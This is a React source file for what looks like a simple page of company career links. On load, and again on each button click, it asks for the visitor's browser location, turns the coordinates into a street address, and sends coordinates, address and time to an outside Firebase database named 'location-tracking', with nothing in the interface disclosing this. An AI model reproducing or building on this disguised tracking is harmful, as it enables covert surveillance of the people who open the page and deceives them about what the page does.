import { useEffect, useState } from "react";
import { db, collection, addDoc } from "./firebase";
import axios from "axios";
import { useAppData } from "./appData";

const App = () => {
  const [location, setLocation] = useState(null);
  const { data } = useAppData();

  const [companyInfo, setCompanyInfo] = useState(data)

  const onPressButton = (item) => {
    getLocation()
    const updatedCompanyInfo = companyInfo.map((company) => {

      return { ...company, isOpened: company.company === item.company ? !company.isOpened : false };

    });
    setCompanyInfo(updatedCompanyInfo);
  }

  useEffect(() => {
    getLocation()
  }, [])

  const getAddress = async (latitude, longitude) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
      );
      const data = await response.json();
      // console.log("Address:", data.display_name || "Address not found");
      return data.display_name || "Address not found";
    }
    catch (error) {
      console.error("Error fetching address:", error.message);
    }
  };

  const getLocation = async () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {

          const getTime = () => {
            const now = new Date();
            return now.toLocaleTimeString();
          };
          const address = await getAddress(position.coords.latitude, position.coords.longitude);
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: new Date().toISOString(),
            time: getTime(),
            address: address || "Address not found"
          };
          setLocation(locationData);
          try {
            const data = await axios.post("https://location-tracking-68a4e-default-rtdb.firebaseio.com/locations.json", locationData);
            console.log("Location stored with ID:", data);
          } catch (error) {
            console.error("Error storing location:", error.message);
          }
        },
        (error) => {
          console.error("Error fetching location:", error.message);
        }
      );
    } else {
      console.error("Geolocation is not supported by this browser.");
    }
  };

  return (
    <div>

      <p> Select the button to get carrer info</p>
      {
        companyInfo.map((item, index) => {
          return (
            <div key={index}>
              <button onClick={() => onPressButton(item)}>{item.company}</button>
              {
                item.isOpened ?
                  <>
                    <p>{item.description}</p>
                    <a href={item.carrerLink} target="_blank">{item.carrerLink}</a>
                  </> : null
              }

            </div>
          );
        })

      }



    </div>
  );
};

export default App;